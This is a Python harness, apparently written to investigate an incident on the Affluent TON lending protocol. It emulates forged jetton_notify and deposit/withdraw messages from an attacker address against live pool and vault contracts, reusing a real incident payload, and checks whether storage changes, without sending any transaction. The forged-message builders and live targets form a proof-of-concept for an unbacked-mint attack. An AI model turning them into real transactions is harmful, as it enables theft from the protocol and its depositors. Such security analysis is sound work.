#!/usr/bin/env python3
"""
Affluent (TON) — local TVM emulation harness (READ-ONLY).

Runs against LIVE account state fetched from TON lite servers, emulates inbound
messages with the native TON transaction emulator (tonpy), and reports whether
each target contract's storage (data cell) changed.

Tests:
  A) BasicPool: forged jetton_notify (op 0x7362d09c) from a non-asset-wallet
     sender, incl. the real incident forward_payload and honest src — does the
     pool credit state (unbacked mint) or is it a pass-through?
  B) Vaults (LendingVault / MultiplyVaultV2): forged jetton_notify and
     provide_aggregated_data deposit/withdraw — do shares get minted?
  C) POSITIVE CONTROL: replay real BasicPool inbound messages — does the harness
     detect storage writes at all?

No transaction is signed or sent. No secrets. Results -> ci-out/ton_emu_results.json
"""
import base64, json, os, time, sys
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount

OUTDIR = os.environ.get("TON_EMU_OUT", os.path.join(os.path.dirname(__file__), "..", "ci-out"))
os.makedirs(OUTDIR, exist_ok=True)

ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
VAULT_SRC = "0:06b609ebd46d170e294651170e077a54865f8ba3ffc9f936893f42b87b2f1cb9"
POOL = "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx"
TARGETS = {
    "BasicPool":         POOL,
    "LV_factorialTON":   "EQADQ6JcK0NMuNM5uwCcS9bjcn2RTvcxYIZjNlhIhywUrfBN",
    "LV_factorialUSDT":  "EQAGtgnr1G0XDilGURcOB3pUhl-Lo__J-TaJP0K4ey8cuSaW",
    "LV_affluentUSDT":   "EQAc65JgiTwcoC3M1VYnQcM2Ivq4DTWOtyY2k2EaBuXsKRAZ",
    "MV2_ton1":          "EQDtxQqkgIRQQR5hWlrQxiJMtLwjR3rEYNUBbEcvPDwCs1Ng",
    "MV2_usdt1":         "EQBzSItiC1vpDUEftDeWDyjgMutf6CIzme16gzn9iNlolpcY",
    "MV2_sentoraWallet": "EQD5O4qzJmVwuKDIfDcuM6HI7fUf1AOolgF2oiPGyqr_WZsp",
}
# real incident tx 59458f7a... forward payload (opaque cell), hex of its BOC
REAL_FWD_HEX = ("b5ee9c720101020100970001d18000d6c13d7a8da2e1c528ca22e1c0ef4a90cbf1747ff93f26d127e8570f65e39729"
                "000e9b1002c44ea652d4092859c67da44e4ca3add6565b0e2897d640a2c51bfb370d8877fa003c117f53cd5b99286b"
                "50080c8239a7aeb5f47ad0727b7f3c574f39fc516a505882010051800688c37402fc8f33dddc0c50a43ca0a44dde80"
                "bc10f9576ecbd6a15105caaa144e470de4df820001")


def coins(b, v):
    if v == 0:
        b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)


def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)


def data_of_account(c): return _data(Account().cell_unpack(c, rec_unpack=True))
def data_of_shard(c):
    sa = ShardAccount().cell_unpack(c, rec_unpack=True)
    return _data(sa.account if sa is not None else None)


def build_notify(amount, sender, fwd_cell):
    b = CellBuilder(); b.store_uint(0x7362d09c, 32); b.store_uint(1700000000000, 64); coins(b, amount)
    b.store_address(Address(sender))
    if fwd_cell is None: b.store_bool(False)
    else: b.store_bool(True); b.store_ref(fwd_cell)
    return b.end_cell()


def build_provide(qid, asset, frm, amount, withdraw=False):
    b = CellBuilder(); b.store_uint(0xb0c69ffe, 32); b.store_uint(qid, 64)
    b.store_bool(False); b.store_bool(False); b.store_bool(False)
    b.store_uint(0xcb03bfaf if withdraw else 0xf9471134, 32)
    b.store_address(Address(asset)); b.store_address(Address(frm))
    coins(b, amount); coins(b, 0); b.store_bool(False)
    return b.end_cell()


def build_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()


def retry(fn, n=8, delay=1.5):
    last = None
    for _ in range(n):
        try:
            return fn()
        except Exception as e:
            last = e; time.sleep(delay)
    raise last


def main():
    lc = LiteClient(mode="roundrobin", timeout=4, num_try=8)
    blk = retry(lambda: lc.get_masterchain_info_ext().last)
    now = lc.get_time()
    _, cfgraw = retry(lambda: lc.get_config_all(blk))
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)   # param 43 trips a config validator in the bundled emulator
    fwd_real = Cell(base64.b64encode(bytes.fromhex(REAL_FWD_HEX)).decode())

    results = {"block_seqno": blk.id.seqno, "now": now, "tests": {}}

    # ---- Test A + B: forged messages on pool + vaults ----
    combos = []
    for name in ("BasicPool",):
        combos.append((f"{name}::notify_att_1e12_empty", name, lambda a: build_notify(10**12, ATTACKER, None)))
        combos.append((f"{name}::notify_att_1e12_realfwd", name, lambda a: build_notify(10**12, ATTACKER, fwd_real)))
        combos.append((f"{name}::notify_att_1e18_realfwd", name, lambda a: build_notify(10**18, ATTACKER, fwd_real)))
        combos.append((f"{name}::notify_vault_1e12_realfwd", name, lambda a: build_notify(10**12, VAULT_SRC, fwd_real)))
        combos.append((f"{name}::notify_srcpool_1e12_realfwd", name, lambda a: build_notify(10**12, a, fwd_real)))
    for name in ("LV_factorialTON", "LV_factorialUSDT", "LV_affluentUSDT", "MV2_ton1", "MV2_usdt1", "MV2_sentoraWallet"):
        combos.append((f"{name}::notify_att_1e18", name, lambda a: build_notify(10**18, ATTACKER, None)))
        combos.append((f"{name}::provide_dep_1e18", name, lambda a: build_provide(1, a, ATTACKER, 10**18, False)))
        combos.append((f"{name}::provide_wd_1e18", name, lambda a: build_provide(1, a, ATTACKER, 10**18, True)))

    for tag, name, mk in combos:
        addr = TARGETS[name]
        try:
            st = retry(lambda: lc.get_account_state(Address(addr), blk))
        except Exception as e:
            results["tests"][tag] = {"error": f"account read: {e!r}"}; continue
        lt = st.last_trans_lt + 1
        ss = st.to_shard_state()
        db = data_of_account(ss.begin_parse().load_ref())
        if db is None:
            results["tests"][tag] = {"error": "no data cell"}; continue
        hb = db.get_hash()
        msg = build_msg(ATTACKER, addr, 1_500_000_000, mk(addr), lt, now)
        em = Emulator(cfg); em.set_ignore_chksig(True)
        try:
            ok = em.emulate_transaction(ss, msg, now, lt)
            da = data_of_shard(em.account.to_cell())
            ha = da.get_hash() if da is not None else None
        except Exception as e:
            results["tests"][tag] = {"error": repr(e)}; continue
        results["tests"][tag] = {"ok": ok, "data_changed": (ha != hb), "before": hb, "after": ha}
        print(f"[{tag}] ok={ok} data_changed={ha != hb}")

    # ---- Test C: positive control (replay real pool inbound messages) ----
    try:
        st = retry(lambda: lc.get_account_state(Address(POOL), blk))
        ss = st.to_shard_state()
        hb = data_of_account(ss.begin_parse().load_ref()).get_hash()
        tl = retry(lambda: lc.get_transactions(Address(POOL), st.last_trans_lt, st.last_trans_hash, 16))
        n_changed = 0; n = 0
        for ti in tl.transactions:
            try:
                cs = ti.transaction.begin_parse()
                cs.load_uint(4); cs.load_uint(256); cs.load_uint(64); cs.load_uint(256)
                cs.load_uint(64); cs.load_uint(32); cs.load_uint(15); cs.load_uint(2); cs.load_uint(2)
                aux = cs.load_ref(); acs = aux.begin_parse()
                if not acs.load_bool(): continue
                msgcell = acs.load_ref()
            except Exception:
                continue
            em = Emulator(cfg); em.set_ignore_chksig(True)
            try:
                em.emulate_transaction(ss, msgcell, now, st.last_trans_lt + 1)
                da = data_of_shard(em.account.to_cell())
                ha = da.get_hash() if da is not None else None
            except Exception:
                continue
            n += 1
            if ha != hb: n_changed += 1
        results["positive_control"] = {"real_pool_msgs_replayed": n, "storage_changed": n_changed}
        print(f"[positive-control] real msgs replayed={n} storage_changed={n_changed}")
    except Exception as e:
        results["positive_control"] = {"error": repr(e)}

    with open(os.path.join(OUTDIR, "ton_emu_results.json"), "w") as f:
        json.dump(results, f, indent=1)
    print("wrote", os.path.join(OUTDIR, "ton_emu_results.json"))


if __name__ == "__main__":
    main()
